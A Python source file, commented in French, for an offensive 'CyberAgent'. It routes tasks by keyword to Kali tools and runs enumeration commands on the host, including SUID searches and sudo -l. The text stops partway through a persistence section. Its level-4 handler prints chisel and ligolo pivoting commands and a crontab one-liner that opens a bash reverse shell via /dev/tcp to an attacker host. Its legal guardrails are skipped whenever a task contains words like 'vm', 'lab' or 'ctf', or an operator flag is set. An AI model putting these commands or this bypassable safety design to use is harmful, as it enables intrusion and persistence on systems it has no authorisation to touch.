"""
CyberAgent OSEE — dispatch intelligent vers les outils Kali.
Détecte la catégorie de tâche, sélectionne l'outil, exécute, parse et analyse.
"""
import re
import os
import tempfile
from typing import Optional
from core.agents.base_agent import BaseAgent
from core.tools.terminal import terminal
from core.tools.c2_manager import c2_manager
from core.tools.kali_tools import search_tools, get_tool, get_by_category, catalog_summary, list_interactive_tools
from core.tools.exploit_engine import (
    checksec, rop_gadgets, find_gadget, cyclic, cyclic_find,
    cyclic_64, cyclic_find_64, get_shellcode, encode_xor,
    elf_info, exploit_summary, find_offset,
)
from core.tools.offensive_engine import offensive

# ── Mots-clés de déclenchement par catégorie ─────────────────────────────────
_TRIGGER_MAP = {
    "recon": [
        "scan", "nmap", "masscan", "rustscan", "port scan", "ports ouverts", "réseau", "network",
        "hôte", "host", "ping", "arp", "netdiscover", "découverte",
        "dns", "dnsenum", "dnsrecon", "fierce", "amass", "sublist3r", "subfinder",
        "sous-domaine", "subdomain", "whois", "theharvester", "osint",
        "shodan", "maltego", "spiderfoot",
    ],
    "web": [
        "nikto", "gobuster", "dirb", "ffuf", "wfuzz", "dirsearch",
        "web", "http", "https", "répertoire", "directory", "fuzz",
        "sqlmap", "sql injection", "wpscan", "wordpress",
        "whatweb", "wafw00f", "vhost", "virtualhost",
        "burp", "burpsuite", "proxy web", "intercepter requête",
        "zap", "zaproxy", "owasp zap", "scanner web",
    ],
    "passwords": [
        "hydra", "medusa", "hashcat", "john", "brute", "bruteforce", "crack",
        "hash", "password", "mot de passe", "credentials", "crédentiels",
        "crackmapexec", "cme", "evil-winrm", "winrm", "kerbrute", "kerberos",
    ],
    "exploitation": [
        "exploit", "msfvenom", "payload", "reverse shell", "bind shell", "shellcode",
        "metasploit", "msfconsole", "msf", "meterpreter", "searchsploit", "exploitdb",
        "impacket", "secretsdump", "psexec", "wmiexec", "ntlmrelay",
    ],
    "reversing": [
        "gdb", "r2", "radare2", "objdump", "readelf", "nm", "strings",
        "désassemble", "desassemble", "disassemble", "reverse engineering",
        "rop", "gadget", "gadgets", "rop chain", "chaîne rop",
        "binwalk", "checksec", "protections", "mitigations", "pie", "aslr", "nx", "canary",
        "ltrace", "strace", "binaire", "binary", "fichier elf", "pwndbg", "peda", "gef",
    ],
    "exploit_engine": [
        "cyclic", "pattern", "offset", "cyclic_find", "de bruijn",
        "shellcode", "xor encode", "xor decoder",
        "checksec", "checksec binaire",
        "rop gadget", "ropper", "ropgadget",
        "exploit_summary", "analyse binaire", "analyze binary",
    ],
    "network": [
        "tcpdump", "tshark", "wireshark", "capture",
        "responder", "ntlmv2", "llmnr", "nbt-ns",
        "bettercap", "ettercap", "mitm", "arp spoofing", "arp-spoofing",
        "netcat", "nc", "socat", "ncat",
        "proxy", "proxychains",
    ],
    "wireless": [
        "aircrack", "aircrack-ng", "airodump", "airodump-ng",
        "aireplay", "aireplay-ng", "airmon", "airmon-ng",
        "wifi", "wpa", "wpa2", "wep",
        "handshake", "beacon", "essid", "bssid", "deauth",
        "mode monitor", "monitor mode", "wlan",
    ],
    "forensics": [
        "volatility", "volatility3", "dump mémoire", "memory dump",
        "foremost", "binwalk", "exiftool", "stéganographie", "steganography",
        "steghide", "forensics", "forensique",
    ],
    "smb": [
        "smb", "smbclient", "smbmap", "enum4linux", "rpcclient",
        "active directory", "ldap", "ntlm", "domain", "domaine",
    ],
    "cloud": [
        "aws", "amazon", "azure", "gcp", "google cloud", "s3", "ec2", "iam",
        "lambda", "cloudtrail", "cloudwatch", "pacu", "scoutsuite", "prowler",
        "cloud security", "sécurité cloud", "bucket", "rôle iam", "sts",
        "cloudformation", "terraform", "kubernetes", "k8s", "docker", "conteneur",
        "ecr", "eks", "ecs", "blob", "storage account", "key vault",
    ],
    "crypto": [
        "chiffrement", "chiffrer", "déchiffrer", "cryptographie", "cryptography",
        "aes", "rsa", "ecc", "des", "3des", "chacha20", "salsa",
        "hash", "sha", "sha256", "sha512", "md5", "bcrypt", "argon2", "pbkdf2",
        "clé symétrique", "clé asymétrique", "clé privée", "clé publique",
        "certificat tls", "tls", "ssl", "pki", "x509", "openssl", "gpg",
        "signature numérique", "hmac", "mac", "nonce", "iv", "padding oracle",
        "xor cipher", "vigenere", "caesar", "rot13", "base64", "encode", "decode",
        "entropy", "entropie", "random", "prng", "csprng",
    ],
    "governance": [
        "iso 27001", "iso27001", "nist", "pci dss", "pcidss", "rgpd", "gdpr",
        "conformité", "compliance", "politique sécurité", "security policy",
        "risk management", "gestion des risques", "audit", "pentest report",
        "rapport pentest", "vulnerability assessment", "évaluation de risques",
        "cvss", "cvss score", "remediation plan", "plan de remédiation",
        "soc 2", "hipaa", "cis benchmark", "cis controls", "mitre att&ck",
        "maturity model", "modèle de maturité", "bcp", "drp", "pra", "pca",
    ],
    "report": [
        "rapport de pentest", "pentest report", "rédiger rapport", "écrire rapport",
        "executive summary", "résumé exécutif", "findings", "recommandations rapport",
        "rapport de sécurité", "rapport d'audit", "debriefing", "restitution",
        "template rapport", "rapport technique", "rapport managérial",
        "cvss calculer", "scoring vulnérabilité", "proof of concept",
        "remédiation", "plan de remédiation", "fiche vulnérabilité",
        "rapport pentest", "structure rapport", "plan rapport",
    ],
    "os_admin": [
        "gestion des processus", "gestion processus", "services linux", "services windows",
        "journalisation", "logs système", "syslog", "journald", "event viewer",
        "permissions fichier", "chmod", "acl", "selinux", "apparmor",
        "systemd", "service", "cron", "crontab", "task scheduler",
        "gestion mémoire", "swap", "ulimit", "limits",
        "hardening", "durcissement", "cis", "benchmark", "baseline",
        "patch management", "gestion patches", "mises à jour", "updates",
        "utilisateurs linux", "users management", "sudo", "sudoers",
        "audit linux", "auditd", "aide", "tripwire", "intégrité fichiers",
        "macos security", "sécurité macos", "gatekeeper", "xprotect",
        "windows hardening", "durcissement windows", "gpo", "group policy",
        "registry", "registre windows", "bitlocker", "defender",
        "windows event", "event viewer", "event log", "powershell sécurité",
        "linux logs", "linux processus", "linux services", "linux permissions",
    ],
    "dev_secure": [
        "owasp", "owasp top 10", "injection sql", "sql injection", "xss", "csrf", "ssrf",
        "broken authentication", "insecure deserialization", "xxe", "idor",
        "sécurité api", "api security", "jwt", "jwt attack", "jwt vulnérabilité",
        "revue de code", "code review", "sast", "dast", "iast", "sonarqube",
        "semgrep", "bandit", "snyk", "veracode", "checkmarx",
        "secure coding", "développement sécurisé", "secure sdlc",
        "dependency confusion", "supply chain", "cve dépendance",
        "secret scanning", "leak credentials", "trufflehog", "gitleaks",
        "cors", "csp", "headers sécurité", "security headers", "hsts",
        "rate limiting", "brute force protection", "captcha",
        "oauth", "openid", "saml", "sso vulnérabilité",
    ],
    # ── Nouveaux domaines ───────────────────────────────────────────────────────
    "reverse_shell": [
        "reverse shell", "revshell", "shell inversé", "shell inverse",
        "générer shell", "créer shell", "créer reverse shell", "webshell", "web shell",
        "bash reverse", "nc -e", "netcat shell", "shell python",
        "shell php", "shell powershell", "shell ruby", "shell perl",
        "bind shell", "one liner shell", "shell golang",
    ],
    "av_bypass": [
        "av bypass", "edr bypass", "amsi bypass", "antivirus bypass",
        "contourner av", "contourner edr", "contourner amsi",
        "obfuscation payload", "shellcode chiffré", "shellcode obfusqué",
        "syswhispers", "hell's gate", "unhooking ntdll",
        "process hollowing", "reflective dll", "process injection av",
        "xor payload", "rc4 payload", "encrypt shellcode", "bypass defender",
    ],
    "xxe": [
        "xxe", "xml external entity", "entité externe xml",
        "dtd injection", "attaque xxe", "xml injection externe",
    ],
    "deserialize": [
        "désérialisation", "deserialization", "ysoserial",
        "pickle exploit", "php unserialize", "java deserialization",
        "python pickle exploit", "object injection", "gadget chain deserialization",
        "java gadget", "net deserialization", "php object injection",
    ],
    "privesc": [
        "privilege escalation", "privesc", "élévation de privilèges",
        "linpeas", "winpeas", "suid bit", "suid exploit",
        "sudo -l exploit", "getcap linux", "capabilities linux",
        "writable cron", "always install elevated", "token impersonation",
        "juicy potato", "printspoofer", "sweet potato", "rogue potato",
        "local privilege escalation", "lpe linux", "lpe windows",
    ],
    "session_hijack": [
        "session hijacking", "détournement de session", "vol de session",
        "cookie stealing", "vol de cookie", "session fixation",
        "csrf attack", "attaque csrf", "forged request",
        "token replay", "manipuler token session", "steal session",
    ],
    "cvss_calc": [
        "calculer cvss", "cvss calculator", "score cvss v3", "score cvss v4",
        "calculer score vulnérabilité", "cvss base score", "cvss scoring",
    ],
}

_ALL_KEYWORDS: dict[str, list[str]] = {}
for cat, kws in _TRIGGER_MAP.items():
    for kw in kws:
        _ALL_KEYWORDS.setdefault(kw, []).append(cat)

# ── Mots-clés des 4 niveaux offensifs ────────────────────────────────────────
_LEVEL_KEYWORDS = {
    1: ["niveau 1", "level 1", "recon avancé", "reconnaissance avancée", "cartographier",
        "analyser logiciel", "comprendre système", "analyser binaire", "strings", "fingerprint"],
    2: ["niveau 2", "level 2", "fuzzing", "fuzz", "afl", "afl++", "libfuzzer", "crash",
        "valgrind", "asan", "sanitizer", "0-day", "zeroday", "bug mémoire", "overflow",
        "use after free", "uaf", "static analysis", "cppcheck"],
    3: ["niveau 3", "level 3", "exploitation", "privesc", "privilege escalation",
        "élévation de privilèges", "linpeas", "suid", "ret2libc", "rop chain",
        "buffer overflow", "shellcode", "pwntools", "heap spray", "rce", "remote code"],
    4: ["niveau 4", "level 4", "pivot", "pivoting", "persistance", "persistence",
        "mouvement latéral", "lateral movement", "chisel", "ligolo", "proxychains",
        "bloodhound", "pass-the-hash", "pth", "exfiltration", "c2", "apt", "pspy",
        "sliver", "havoc", "mythic", "meterpreter", "cobalt strike",
        "phishing", "gophish", "evilginx", "setoolkit",
        "mimikatz", "rubeus", "powerview", "kerberoast", "as-rep", "asrep",
        "netexec", "crackmapexec"],
    0: ["pipeline", "fuzzing pipeline", "fuzz crash", "crash exploit", "fuzzing exploit",
        "exploit template", "générer exploit", "workflow complet", "fuzz → exploit"],
}


class CyberAgent(BaseAgent):
    name = "cyber"
    description = "Expert OSEE — 4 niveaux Red Team, fuzzing pipeline, recon, exploitation, mouvement"

    def can_handle(self, task: str) -> bool:
        t = task.lower()
        if any(kw in t for kw in _ALL_KEYWORDS):
            return True
        for kws in _LEVEL_KEYWORDS.values():
            if any(kw in t for kw in kws):
                return True
        return False

    # ── Guardrails légaux ────────────────────────────────────────────────────
    # Patterns illégaux → (message_risque, suggestions_légales)
    _GUARDRAIL_RULES = [
        {
            "patterns": ["pirater wifi", "cracker wifi", "hacker wifi", "casser wpa",
                         "cracker un réseau wifi", "scanner les réseau wifi au toure",
                         "scanner les reseau wifi", "comment pirater un wifi",
                         "crack wifi voisin", "wifi voisin", "réseau de mon voisin",
                         "wpa voisin", "wpa2 voisin"],
            "exemptions": ["mon réseau", "mon wifi", "mon lab", "mon routeur", "ctf",
                           "hackthebox", "tryhackme", "test réseau", "authorized",
                           "wlan0mon", "airodump-ng", "airmon-ng"],
            "risk": "Cracking de réseau WiFi non autorisé",
            "law": "Article 323-1 Code Pénal FR — jusqu'à 2 ans + 60 000€",
            "legal_path": [
                "✅ Configurer un routeur personnel en lab (Raspberry Pi)",
                "✅ Utiliser une VM avec adaptateur WiFi USB en mode monitor",
                "✅ HackTheBox / TryHackMe — challenges WiFi légaux",
                "✅ Certification WiFi (OSWP) sur environnement Offensive Security",
                "✅ 'airmon-ng start mon propre réseau' → test sur ton propre SSID",
            ],
        },
        {
            "patterns": ["phishing utilisateurs", "phishing clients", "phishing employés",
                         "pirater email", "pirater compte email", "voler compte",
                         "voler identifiants", "voler mot de passe", "voler credentials",
                         "hameçonner", "arnaquer", "escroquer"],
            "exemptions": ["simulation", "campagne autorisée", "red team autorisé",
                           "pentest autorisé", "ctf", "hackthebox", "test employés",
                           "sensibilisation", "gophish entreprise"],
            "risk": "Phishing / vol de credentials sans autorisation",
            "law": "Article 313-1 Code Pénal FR — escroquerie jusqu'à 5 ans + 375 000€",
            "legal_path": [
                "✅ Campagne phishing interne autorisée par écrit (RSSI + direction)",
                "✅ GoPhish sur lab interne pour former les équipes",
                "✅ TryHackMe — module Phishing légal",
                "✅ Certification OSCP/CEH — exercices phishing contrôlés",
            ],
        },
        {
            "patterns": ["contourner protection", "contourner les protection", "contourner les protections",
                         "bypass protection", "contourner sécurité", "bypass sécurité",
                         "déverrouiller iphone", "débloquer téléphone",
                         "contourner mdp", "bypass password", "contourner windows",
                         "crack windows", "bypass drm", "contourner drm",
                         "pirater compte", "hacker compte instagram", "hacker facebook",
                         "hacker snapchat", "pirater snapchat", "pirater instagram",
                         "pirater whatsapp"],
            "exemptions": ["mon compte", "mon téléphone", "mon pc", "mon appareil",
                           "ctf", "hackthebox", "lab", "vm", "machine virtuelle",
                           "pentest autorisé", "authorized"],
            "risk": "Contournement de protections / accès non autorisé",
            "law": "Article 323-1 Code Pénal FR — accès frauduleux STAD",
            "legal_path": [
                "✅ Récupérer ton propre compte via le processus officiel",
                "✅ HackTheBox / TryHackMe — machines légales à compromettre",
                "✅ Metasploitable, DVWA, VulnHub — labs intentionnellement vulnérables",
                "✅ CTF (Capture The Flag) — compétitions légales mondiales",
            ],
        },
        {
            "patterns": ["ddos", "dos attack", "attaque ddos", "flood server",
                         "déni de service", "rendre inaccessible", "saturer serveur",
                         "botnet", "bot net"],
            "exemptions": ["lab", "vm", "machine virtuelle", "test local", "localhost",
                           "mon serveur", "ctf", "authorized"],
            "risk": "Attaque par déni de service (DoS/DDoS)",
            "law": "Article 323-2 Code Pénal FR — jusqu'à 5 ans + 75 000€",
            "legal_path": [
                "✅ Tester la résilience de TES propres serveurs",
                "✅ Outils légaux : locust, k6, wrk (load testing autorisé)",
                "✅ Bug bounty — signaler les vulnérabilités aux éditeurs",
            ],
        },
        {
            "patterns": ["créer un virus", "créer un malware", "créer un ransomware",
                         "créer un trojan", "écrire un malware", "coder un virus",
                         "développer malware", "spreader", "se propager"],
            "exemptions": ["analyse", "reverse", "sandbox", "lab", "ctf", "malware analysis",
                           "comprendre comment fonctionne", "détecter"],
            "risk": "Création de logiciel malveillant",
            "law": "Article 323-3-1 Code Pénal FR — jusqu'à 5 ans + 75 000€",
            "legal_path": [
                "✅ Analyser des malwares existants en sandbox (Any.run, Cuckoo)",
                "✅ Certification GREM (GIAC Reverse Engineering Malware)",
                "✅ Défense : déployer un EDR et analyser les détections",
            ],
        },
    ]

    # Contexte d'autorisation légitime — exemption universelle
    _PENTEST_AUTH_CONTEXT = [
        "pentest autorisé", "authorized pentest", "bug bounty", "ctf",
        "hackthebox", "tryhackme", "capture the flag", "red team autorisé",
        "lab personnel", "environnement de test", "vm", "machine virtuelle",
        "mon propre", "ma propre", "mon infrastructure", "notre infrastructure",
    ]

    def _check_guardrails(self, task: str) -> Optional[dict]:
        """
        Vérifie les guardrails légaux.
        Retourne un message éducatif si la requête est hors périmètre légal,
        None si tout est ok.
        OPERATOR_MODE=true dans .env désactive complètement ces guardrails agents.
        """
        from app.config import settings
        if settings.OPERATOR_MODE:
            return None  # Opérateur confirmé — plein accès

        t = task.lower().strip()

        # Contexte d'autorisation universelle → bypass guardrails
        if any(ctx in t for ctx in self._PENTEST_AUTH_CONTEXT):
            return None

        for rule in self._GUARDRAIL_RULES:
            # Vérifier si un pattern de risque correspond
            if not any(p in t for p in rule["patterns"]):
                continue
            # Vérifier les exemptions spécifiques à la règle
            if any(ex in t for ex in rule["exemptions"]):
                continue

            # Guardrail déclenché
            legal_steps = "\n".join(f"  {s}" for s in rule["legal_path"])
            return self._result(True,
                f"⚠️  GUARDRAIL — {rule['risk']}\n"
                f"{'─' * 50}\n\n"
                f"🚫 Cette action est illégale sans autorisation explicite.\n"
                f"📖 Cadre légal : {rule['law']}\n\n"
                f"{'─' * 50}\n"
                f"✅ ALTERNATIVES LÉGALES ET FORMATIVES :\n\n"
                f"{legal_steps}\n\n"
                f"{'─' * 50}\n"
                f"💡 Pour un pentest autorisé, fournis le contexte :\n"
                f"   → 'pentest autorisé sur [cible] — périmètre [scope]'\n"
                f"   → 'ctf [nom de la compétition]'\n"
                f"   → 'lab personnel [description]'\n\n"
                f"L'Œil de Dieu est un outil offensif professionnel.\n"
                f"Son utilisation engage ta responsabilité légale.",
                {"guardrail": True, "risk": rule["risk"], "law": rule["law"]},
            )

        return None

    # Mots-clés exclusifs à dev_secure/report — prioritaires sur _dispatch_level
    _DEV_SECURE_PRIORITY = {"owasp", "sast", "dast", "xss", "csrf", "ssrf", "idor",
                             "jwt", "cors", "csp", "hsts", "semgrep", "snyk", "bandit",
                             "supply chain", "dependency confusion", "trufflehog", "gitleaks",
                             "code review", "revue de code", "owasp top 10", "injection sql",
                             "sql injection", "api security", "sécurité api"}
    _REPORT_PRIORITY = {"executive summary", "résumé exécutif", "template rapport",
                        "rapport de pentest", "plan rapport", "findings",
                        "remédiation", "plan de remédiation", "fiche vulnérabilité",
                        "rapport pentest", "structure rapport"}

    # ── Priorités nouveaux domaines ───────────────────────────────────────────
    _REVSHELL_PRIORITY = {
        "reverse shell", "revshell", "shell inversé", "bind shell", "webshell",
        "web shell", "générer shell", "créer shell", "créer reverse shell",
        "one liner shell", "bash reverse", "shell python", "shell php",
        "shell powershell", "shell ruby", "shell perl", "shell golang", "nc -e",
    }
    _AVBYPASS_PRIORITY = {
        "av bypass", "edr bypass", "amsi bypass", "antivirus bypass",
        "contourner av", "contourner edr", "contourner amsi",
        "obfuscation payload", "syswhispers", "hell's gate",
        "unhooking ntdll", "process hollowing", "reflective dll",
        "xor payload", "rc4 payload", "encrypt shellcode", "bypass defender",
    }
    _XXE_PRIORITY = {
        "xxe", "xml external entity", "entité externe xml",
        "dtd injection", "attaque xxe",
    }
    _DESERIALIZE_PRIORITY = {
        "désérialisation", "deserialization", "ysoserial",
        "pickle exploit", "php unserialize", "java deserialization",
        "python pickle exploit", "object injection", "gadget chain",
    }
    _PRIVESC_PRIORITY = {
        "linpeas", "winpeas", "privilege escalation", "privesc",
        "élévation de privilèges", "juicy potato", "printspoofer",
        "suid bit", "suid exploit", "token impersonation", "sweet potato",
        "always install elevated", "local privilege escalation",
    }
    _SESSION_PRIORITY = {
        "session hijacking", "détournement de session", "cookie stealing",
        "vol de cookie", "session fixation", "csrf attack", "attaque csrf",
        "forged request", "token replay", "manipuler token session",
    }
    _CVSS_PRIORITY = {
        "calculer cvss", "cvss calculator", "score cvss v3", "score cvss v4",
        "calculer score vulnérabilité", "cvss base score", "cvss scoring",
    }

    async def run(self, task: str, context: Optional[dict] = None) -> dict:
        t = task.lower().strip()

        # 0. Guardrails légaux — vérification avant tout dispatch
        guardrail = self._check_guardrails(task)
        if guardrail is not None:
            return guardrail

        # 0a. Priorité dev_secure et report (avant dispatch niveaux)
        if any(kw in t for kw in self._DEV_SECURE_PRIORITY):
            return self._handle_dev_secure(task)
        if any(kw in t for kw in self._REPORT_PRIORITY):
            return self._handle_report(task)

        # 0c. Nouveaux domaines prioritaires
        if any(kw in t for kw in self._REVSHELL_PRIORITY):
            return self._handle_reverse_shell(task)
        if any(kw in t for kw in self._AVBYPASS_PRIORITY):
            return self._handle_av_bypass(task)
        if any(kw in t for kw in self._XXE_PRIORITY):
            return self._handle_xxe(task)
        if any(kw in t for kw in self._DESERIALIZE_PRIORITY):
            return self._handle_deserialize(task)
        if any(kw in t for kw in self._PRIVESC_PRIORITY):
            return self._handle_privesc(task)
        if any(kw in t for kw in self._SESSION_PRIORITY):
            return self._handle_session_hijack(task)
        if any(kw in t for kw in self._CVSS_PRIORITY):
            return self._handle_cvss(task)

        # 0b. Niveaux offensifs explicites
        level_result = self._dispatch_level(task, t)
        if level_result is not None:
            return level_result

        # 1. Exploit engine (pas de commande shell)
        if self._is_exploit_engine(t):
            return self._handle_exploit_engine(task)

        # 2. Commande directe (commence par un nom d'outil connu avec flags CLI)
        direct_cmd = self._extract_direct_command(task)
        if direct_cmd:
            return self._run_command(direct_cmd, task)

        # 3. Dispatch par catégorie
        category = self._detect_category(t)
        if category == "recon":
            return self._handle_recon(task)
        elif category == "web":
            return self._handle_web(task)
        elif category == "passwords":
            return self._handle_passwords(task)
        elif category == "exploitation":
            return self._handle_exploitation(task)
        elif category == "reversing":
            return self._handle_reversing(task)
        elif category == "network":
            return self._handle_network(task)
        elif category == "forensics":
            return self._handle_forensics(task)
        elif category == "wireless":
            return self._handle_wireless(task)
        elif category == "smb":
            return self._handle_smb(task)
        elif category == "cloud":
            return self._handle_cloud(task)
        elif category == "crypto":
            return self._handle_crypto(task)
        elif category == "governance":
            return self._handle_governance(task)
        elif category == "report":
            return self._handle_report(task)
        elif category == "os_admin":
            return self._handle_os_admin(task)
        elif category == "dev_secure":
            return self._handle_dev_secure(task)
        elif category == "reverse_shell":
            return self._handle_reverse_shell(task)
        elif category == "av_bypass":
            return self._handle_av_bypass(task)
        elif category == "xxe":
            return self._handle_xxe(task)
        elif category == "deserialize":
            return self._handle_deserialize(task)
        elif category == "privesc":
            return self._handle_privesc(task)
        elif category == "session_hijack":
            return self._handle_session_hijack(task)
        elif category == "cvss_calc":
            return self._handle_cvss(task)

        # 4. Catalogue
        if any(kw in t for kw in ["liste", "list", "catalogue", "quels outils", "what tools", "available"]):
            return self._result(True, catalog_summary())

        return self._result(True,
            "⚔️ CYBER AGENT — Je n'ai pas reconnu de commande spécifique.\n\n"
            "Utilise une commande explicite, ex :\n"
            "  scan <IP>               → reconnaissance nmap\n"
            "  gobuster http://<IP>    → enumération web\n"
            "  crack <hash>            → hashcat/john\n"
            "  exploit <binaire>       → template pwntools\n"
            "  privesc linux           → checklist élévation\n"
            "  niveau 1 / niveau 4     → guides Red Team\n\n"
            "Ou passe par le Chat pour une question en langage naturel.")

    # ── Dispatch niveaux offensifs ────────────────────────────────────────────

    def _dispatch_level(self, task: str, t: str) -> Optional[dict]:
        # Pipeline complet
        if any(kw in t for kw in _LEVEL_KEYWORDS[0]):
            return self._handle_pipeline(task)

        # Niveau 2 — fuzzing / vuln finding
        if any(kw in t for kw in _LEVEL_KEYWORDS[2]):
            return self._handle_level2(task)

        # Niveau 3 — exploitation avancée
        if any(kw in t for kw in _LEVEL_KEYWORDS[3]):
            return self._handle_level3(task)

        # Niveau 4 — mouvement avancé
        if any(kw in t for kw in _LEVEL_KEYWORDS[4]):
            return self._handle_level4(task)

        # Niveau 1 explicite (recon avancé)
        if any(kw in t for kw in _LEVEL_KEYWORDS[1]):
            return self._handle_level1(task)

        return None

    def _handle_level1(self, task: str) -> dict:
        lvl = offensive.get_level(1)
        target = self._extract_target(task) or self._extract_url_or_target(task)
        binary = self._extract_file_path(task)
        t = task.lower()

        if binary and any(kw in t for kw in ["strings", "analyse binaire", "readelf", "objdump"]):
            tool_name = "strings" if "strings" in t else ("readelf" if "readelf" in t else "objdump")
            result = offensive.run_level_tool(1, tool_name, {"binary": binary})
            return self._result(result["success"], result.get("output", ""), result)

        if target:
            tool_name = "nuclei" if "cve" in t else ("gobuster" if "répertoire" in t or "dir" in t else "nmap")
            result = offensive.run_level_tool(1, tool_name, {"target": target})
            return self._result(result["success"], result.get("output", ""), result)

        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 1 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles :\n{tools_list}\n\n"
            f"Spécifie une cible (IP, domaine) ou un binaire pour lancer.",
            {"level": 1, "tools": [t.name for t in lvl.tools]})

    def _handle_level2(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        if any(kw in t for kw in ["fuzz", "afl", "afl++"]):
            if binary:
                result = offensive.run_pipeline("fuzz", binary=binary, timeout=20)
                out = (
                    f"Fuzzing lancé sur {binary}\n"
                    f"Crashs trouvés : {result.get('crashes_found', 0)}\n"
                    f"Résultat AFL++ :\n{result.get('result', '')[:500]}\n\n"
                    f"Prochaine étape : {result.get('next_step', '')}"
                )
                return self._result(result["success"], out, result)
            return self._result(True,
                "🐛 NIVEAU 2 — Fuzzing avec AFL++\n\n"
                "Workflow :\n"
                "  1. Préparer corpus : mkdir corpus && echo 'test' > corpus/seed\n"
                "  2. Lancer AFL++ : afl-fuzz -i corpus/ -o findings/ -- ./binary @@\n"
                "  3. Analyser crashs : ls findings/default/crashes/\n"
                "  4. Rejouer crash : ./binary < findings/default/crashes/id:000000*\n\n"
                "Spécifie le binaire à fuzzer pour lancer directement.\n"
                "Ex: fuzzer ./target",
                {"level": 2})

        if any(kw in t for kw in ["crash", "analyse crash", "triage"]):
            crash = self._extract_file_path(task)
            if binary and crash:
                result = offensive.run_pipeline("analyse_crash", binary=binary, crash=crash)
                return self._result(result["success"],
                    f"Analyse crash {crash} :\n"
                    f"Exploitabilité : {result.get('exploitability', {}).get('recommendation', '')}\n"
                    f"Score : {result.get('exploitability', {}).get('score', 0)}/10\n\n"
                    f"Stack trace :\n{result.get('gdb_trace', '')[:800]}\n\n"
                    f"Prochaine étape : {result.get('next_step', '')}",
                    result)

        if any(kw in t for kw in ["valgrind", "mémoire", "memory", "leak"]):
            if binary:
                return self._run_command(f"valgrind --tool=memcheck --leak-check=full {binary}", task)

        if any(kw in t for kw in ["semgrep", "bandit", "static", "analyse code"]):
            path = binary or "."
            if "python" in t or "bandit" in t:
                return self._run_command(f"bandit -r {path} -l", task)
            return self._run_command(f"semgrep --config=auto {path}", task)

        lvl = offensive.get_level(2)
        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 2 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles :\n{tools_list}\n\n"
            f"Commandes rapides :\n"
            f"  fuzzer ./binary         → AFL++ fuzzing\n"
            f"  valgrind ./binary       → analyse mémoire\n"
            f"  semgrep ./src/          → analyse statique\n"
            f"  searchsploit apache 2.4 → recherche CVE",
            {"level": 2, "tools": [t.name for t in lvl.tools]})

    def _handle_level3(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        if any(kw in t for kw in ["privesc", "privilege", "élévation", "linpeas", "suid"]):
            if "suid" in t:
                return self._run_command("find / -perm -4000 -user root -type f 2>/dev/null", task)
            if "sudo" in t:
                return self._run_command("sudo -l 2>/dev/null", task)
            return self._result(True,
                "💥 NIVEAU 3 — Élévation de privilèges Linux\n\n"
                "Checklist :\n"
                "  1. sudo -l                                   → droits sudo\n"
                "  2. find / -perm -4000 -user root -type f     → binaires SUID\n"
                "  3. bash linpeas.sh                           → enum complète\n"
                "  4. cat /etc/crontab                          → tâches cron\n"
                "  5. ls -la /etc/passwd /etc/shadow            → permissions\n"
                "  6. uname -a && cat /etc/issue               → version kernel\n"
                "  7. searchsploit linux kernel <version>       → exploits kernel\n\n"
                "GTFOBins : https://gtfobins.github.io/ (exploits SUID/sudo)",
                {"level": 3})

        if any(kw in t for kw in ["rop", "ret2libc", "exploit template", "générer exploit"]):
            if binary:
                offset_match = re.search(r"\boffset[:\s]+(\d+)\b", t)
                offset = int(offset_match.group(1)) if offset_match else 0
                lhost = self._extract_ip(task) or "127.0.0.1"
                lport = int(self._extract_port(task) or 4444)
                result = offensive.run_pipeline("exploit_template", binary=binary,
                                                offset=offset, lhost=lhost, lport=lport)
                return self._result(result["success"],
                    f"Template exploit généré :\n"
                    f"Stratégie : {result.get('strategy', '')}\n"
                    f"Protections : {result.get('protections', {})}\n\n"
                    f"Code pwntools :\n{result.get('exploit_template', '')}",
                    result)

        if any(kw in t for kw in ["rce", "shellcode", "pwntools"]):
            if binary:
                result = offensive.run_pipeline("reverse", binary=binary)
                return self._result(result["success"],
                    f"Analyse exploitation de {binary} :\n"
                    f"Fonctions dangereuses : {result.get('dangerous_functions', [])}\n"
                    f"Gadgets ROP :\n{result.get('rop_gadgets_sample', '')[:600]}",
                    result)

        lvl = offensive.get_level(3)
        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 3 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles :\n{tools_list}\n\n"
            f"Commandes rapides :\n"
            f"  privesc linux             → checklist élévation de privs\n"
            f"  exploit template ./binary → générer exploit pwntools\n"
            f"  rop gadgets ./binary      → chaîne ROP\n"
            f"  metasploit exploit/...    → Metasploit Framework",
            {"level": 3, "tools": [t.name for t in lvl.tools]})

    def _handle_level4(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)
        lhost = self._extract_ip(task)
        lport = self._extract_port(task) or "4444"

        if any(kw in t for kw in ["pivot", "chisel", "tunnel"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Pivoting réseau\n\n"
                "Chisel (tunnel TCP/HTTP) :\n"
                "  Attaquant : chisel server -p 8080 --reverse\n"
                "  Victime   : chisel client <attaquant>:8080 R:socks\n"
                "  Config    : proxychains4 → socks5 127.0.0.1 1080\n\n"
                "Ligolo-ng (plus rapide) :\n"
                "  Proxy     : ligolo-ng -selfcert -laddr 0.0.0.0:443\n"
                "  Agent     : ligolo-ng -connect <attaquant>:443 -ignore-cert\n\n"
                "SSHuttle (VPN SSH) :\n"
                f"  sshuttle -r user@{target or 'pivot'} 10.0.0.0/8",
                {"level": 4})

        if any(kw in t for kw in ["persist", "persistance", "crontab", "cron", "backdoor"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Persistance\n\n"
                f"Crontab (sans root) :\n"
                f"  (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/{lhost or 'LHOST'}/{lport} 0>&1') | crontab -\n\n"
                f"Clé SSH :\n"
                f"  mkdir -p ~/.ssh && echo '<pubkey>' >> ~/.ssh/authorized_keys\n\n"
                f"Service systemd (root) :\n"
